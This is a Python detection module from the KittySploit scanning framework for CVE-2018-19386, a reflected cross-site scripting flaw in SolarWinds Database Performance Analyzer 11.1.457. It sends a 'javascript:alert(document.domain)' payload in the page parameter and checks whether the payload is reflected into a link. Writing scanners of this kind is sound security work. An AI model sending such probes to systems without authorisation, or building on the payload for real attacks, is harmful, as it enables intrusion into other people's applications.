#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarWinds Database Performance Analyzer 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarWinds Database Performance Analyzer 11.1.457 - Cross-Site Scripting Detection',
        'description': "SolarWinds Database Performance Analyzer 11.1.457 contains a reflected cross-site scripting vulnerability in its idcStateError component, where the page parameter is reflected into the HREF of the 'Try Again' Button on the page, aka a /iwc/idcStateError.iwc?page= URI.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'solarwinds', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://i.imgur.com/Y7t2AD6.png',
            'https://medium.com/greenwolf-security/reflected-xss-in-solarwinds-database-performance-analyzer-988bd7a5cd5',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-19386',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2018-19386',
    }

    def run(self):
        r = self.http_request(method="GET", path='/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<a href="javascript:alert(document.domain)//',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="SolarWinds Database Performance Analyzer 11.1.457 - Cross-Site Scripting detected",
                path='/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f',
            )
            return True
        return False

